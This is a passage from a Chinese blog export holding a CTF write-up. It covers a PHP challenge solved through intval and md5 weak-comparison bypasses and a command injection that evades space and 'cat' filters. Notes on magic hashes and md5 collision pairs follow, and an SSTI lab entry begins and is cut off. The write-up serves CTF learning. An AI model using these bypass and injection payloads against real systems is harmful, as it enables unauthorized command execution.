且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>去非洲吧<br></code></pre></td></tr></table></figure><hr><p>很明显最终要命令执行拿到flag，并且我们要绕过三个关卡。</p><p><strong>首先第一个</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里要我们用get方法传入一个num，并且intval($num)要小于2020，intval($num + 1)要大于2021。</p><p>这里使用科学计数法绕过</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=2e4<br><br>原理：<br>我们传入的值默认是字符串，而第一个intval(<span class="hljs-variable">$num</span>)会将首个字母前的数字转化为整数，所有就会等于2，小于2020<br>而第二个intval(<span class="hljs-variable">$num</span> + 1)，会先将<span class="hljs-variable">$num</span>即<span class="hljs-string">&quot;2e4&quot;</span>转化为整数20000然后加1，就会等于20001，大于2021<br>成功绕过<br></code></pre></td></tr></table></figure><p>注意：这里绕过只在php7.0版本以下可行，在7.0版本以上intval(‘2e4’)的值为20000，没有上面的特性</p><hr><p>第二个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里很明显要使$md5 &#x3D;&#x3D; md5($md5)，即可绕过，我们可以传入一些特殊的值，在php弱类型比较中0e后面只有数字的字符串</p><p>比如0e123124，在弱类型比较中都为0，所以我们需要传入一个这种类型的数，让其md5后的字符串也为0exxx的类型</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">0</span>e215962017<br>md5<span class="hljs-punctuation">(</span>&#x27;0e<span class="hljs-number">21596201</span>7&#x27;<span class="hljs-punctuation">)</span><span class="hljs-meta">#0e291242476940776845150308577824</span><br><br><br><span class="hljs-meta">&amp;md5=0e215962017</span><br></code></pre></td></tr></table></figure><hr><p>第三关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123;<br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快到非洲了&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只要我们成功绕过就能执行system函数，执行我们输入的命令，但是有过滤，<code>strstr($get_flag,&quot; &quot;)</code>过滤了空格，<code>str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</code>过滤了’cat’。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">在命令执行中，空格可以用<span class="hljs-variable">$IFS</span>、<span class="hljs-variable">$&#123;IFS&#125;</span>、$IFS<span class="hljs-variable">$1</span>、$IFS<span class="hljs-variable">$9</span>来代替<br><span class="hljs-built_in">cat</span>命令可以用more、less、<span class="hljs-built_in">head</span>、<span class="hljs-built_in">tail</span>、<span class="hljs-built_in">sort</span>、ca\t、<span class="hljs-built_in">tac</span>代替<br></code></pre></td></tr></table></figure><p>我们这里就用$IFS$9和tac了</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">&amp;get_flag=tac$IFS$9flag<br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">先用<span class="hljs-built_in">ls</span>查看下当前目录，结合前面的payload<br>?num=2e4&amp;md5=0e215962017&amp;get_flag=<span class="hljs-built_in">ls</span><br><br>发现一个文件fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br></code></pre></td></tr></table></figure><p><img src="/../image/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1-4.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">读取该文件<br>?num=<span class="hljs-number">2e4</span>&amp;md5=<span class="hljs-number">0e215962017</span>&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag<br></code></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;5f0404c6-<span class="hljs-number">3258</span>-<span class="hljs-number">4b55</span>-a741-3695ec2567a5&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="intval特性（php7-0以下）"><a href="#intval特性（php7-0以下）" class="headerlink" title="intval特性（php7.0以下）"></a>intval特性（php7.0以下）</h3><p>只在php7.0以下版本有效</p><p>intval中在转化字符串变量时，而将变量首个字母前的数字转化为整数，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">比如<br><span class="hljs-built_in">echo</span> intval(<span class="hljs-string">&#x27;2e4&#x27;</span>);<br><br><span class="hljs-comment">#2</span><br></code></pre></td></tr></table></figure><p>当在intval中进行算术运算时，比如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">intval</span>(&#x27;<span class="hljs-number">2</span>e4&#x27; + <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>会先将2e4当成科学计算法，转化为数值，即20000，然后再进行运算</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> intval(&#x27;<span class="hljs-number">2</span>e4&#x27; + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">#20001</span><br></code></pre></td></tr></table></figure><hr><h3 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h3><h4 id="md5弱类型比较"><a href="#md5弱类型比较" class="headerlink" title="md5弱类型比较"></a>md5弱类型比较</h4><p><strong>题目一：</strong></p><p><strong>一个字符串与<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后的值相等</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-variable">$md5</span> == md5(<span class="hljs-variable">$md5</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>特性：0exxx类型字符串在php弱类型比较中的值都为0</p><p>题目要求一个字符串与<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后的值相等，通过上面PHP 0e漏洞的原理，也就将此题转化成 &#x3D;&#x3D;&gt;寻找一个字符串（0e开头）加密后（还是0e开头），弱比较相等。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c">特殊值<br><span class="hljs-number">0</span>e215962017<br><br>echo md5<span class="hljs-punctuation">(</span>&#x27;0e<span class="hljs-number">21596201</span>7&#x27;<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span><br><br><span class="hljs-meta">#0e291242476940776845150308577824</span><br></code></pre></td></tr></table></figure><hr><p>题目二：</p><p><strong>两个字符串md5后进行弱类型比较相等</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> != <span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GET_FLAG：&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;md5校验出错...&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名密码不能相等！&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 用户名密码不能相等<br></code></pre></td></tr></table></figure><p>题目中，要求两个字符串值不能相等，但是两个字符串经过md5加密后的值需要相等，通过上面PHP 0e漏洞的原理，也就将此题转化成 &#x3D;&#x3D;&gt; 寻找两个值加密后以0e开头，且0e后面是纯数字的字符串即可，</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">240610708</span> <br><span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span><br> <br><span class="hljs-number">314282422</span> <br><span class="hljs-number">0</span>e9909955048216994945<span class="hljs-number">20356953734</span><br> <br><span class="hljs-number">571579406</span> <br><span class="hljs-number">0</span>e972379832854295224<span class="hljs-number">118025748221</span><br><br>QLTHNDT <br><span class="hljs-number">0</span>e40596782540195537<span class="hljs-number">2549139051580</span><br> <br>QNKCDZO <br><span class="hljs-number">0</span>e830400451993494058<span class="hljs-number">024219903391</span><br> <br>EEIZDOI <br><span class="hljs-number">0</span>e78260136353929177<span class="hljs-number">9881938479162</span><br> <br>TUFEPMC <br><span class="hljs-number">0</span>e839407194569345277<span class="hljs-number">863905212547</span><br> <br>UTIPEZQ <br><span class="hljs-number">0</span>e3820987882312349546<span class="hljs-number">70291303879</span><br></code></pre></td></tr></table></figure><hr><h4 id="md5强类型比较"><a href="#md5强类型比较" class="headerlink" title="md5强类型比较"></a>md5强类型比较</h4><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> != <span class="hljs-variable">$password</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$username</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;GET_FLAG：&#x27;</span>.<span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;md5校验出错...&#x27;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;用户名密码不能相等！&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> 用户名密码不能相等！<br><br></code></pre></td></tr></table></figure><p>全等运算符“&#x3D;&#x3D;&#x3D;”，既比较值又比较类型，题目中“!&#x3D;”意思为“不等于”，具体可查看菜鸟教程关于“!&#x3D;”说明，值不相等时返回“ture”，也就是说两个参数值要不相等，两个参数在md5加密后全相等，也就是说两个参数在md5加密后不仅值相等类型也要一致，此时就无法利用PHP 0e漏洞了，需要别的方法绕过。可以利用md5在加密字符串时会warining，输出结果为NULL，传入两个数组，这样就能使两个参数在md5加密后的类型是一致的。</p><p>payload:?username[]&#x3D;1&amp;password[]&#x3D;2</p><h4 id="md5强碰撞（绕过强类型比较）"><a href="#md5强碰撞（绕过强类型比较）" class="headerlink" title="md5强碰撞（绕过强类型比较）"></a>md5强碰撞（绕过强类型比较）</h4><p>两个字符串不同，但是md5加密后的值相同，这就是md5碰撞，可以通过工具生成，这里有两个例子，可以用来绕过强类型比较</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br>&amp;b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span><br><br>a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure><h4 id="算数运算配合自动类型转换"><a href="#算数运算配合自动类型转换" class="headerlink" title="算数运算配合自动类型转换"></a>算数运算配合自动类型转换</h4><p>md5()遇到算数符时，会先运算，再计算结果的md5值</p><p>所以，当字符串与数字类型运算时，会将字符串转换成数字类型再参与运算，最后计算运算结果的MD5值</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> md5<span class="hljs-params">(3)</span><span class="hljs-string">.PHP_EOL</span>;<br><span class="hljs-keyword">echo</span> md5<span class="hljs-params">(&#x27;2&#x27; + 1)</span><span class="hljs-string">.PHP_EOL</span>;<br><br>eccbc87e4b5ce2fe28308fd9f2a7baf3<br>eccbc87e4b5ce2fe28308fd9f2a7baf3<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php特性 </tag>
            
            <tag> md5 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> intval </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssti-flask-labs</title>
      <link href="/2025/03/24/ssti-flask-labs/"/>
      <url>/2025/03/24/ssti-flask-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="ssti-flask-labs"><a href="#ssti-flask-labs" class="headerlink" title="ssti-flask-labs"></a>ssti-flask-labs</h1><p><strong>获取键值或下标的方式</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h5 id="获取属性的方式"><a href="#获取属性的方式" class="headerlink" title="获取属性的方式"></a>获取属性的方式</h5><figure class="highlight gcode"><table><tr><td 